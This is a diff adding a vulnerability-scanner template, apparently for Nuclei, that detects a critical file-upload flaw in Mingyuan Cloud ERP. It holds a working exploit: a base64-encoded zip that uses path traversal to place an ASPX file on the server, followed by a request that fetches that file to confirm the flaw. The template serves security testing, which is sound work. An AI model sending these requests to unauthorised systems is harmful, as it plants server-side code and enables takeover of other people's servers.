@@ -1,0 +1,47 @@
+id: mingyuan-erp-file-upload
+info:
+  name: Mingyuan Cloud ERP ApiUpdate.ashx File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Mingyuan Cloud ERP contains a file upload vulnerability that allows attackers to upload malicious files, execute code on the server, and take full control of the web server.
+  reference:
+    - http://www.myunke.com/
+  tags: file-upload
+
+variables:
+  payload_encoded: "UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA=="
+
+http:
+  - raw:
+      - |
+          POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          {{base64_decode(payload_encoded)}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "cc4041b9"
+
+  - raw:
+      - |
+          GET /fdccloud/_/check.aspx HTTP/1.1
+          Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "cc4041b9"
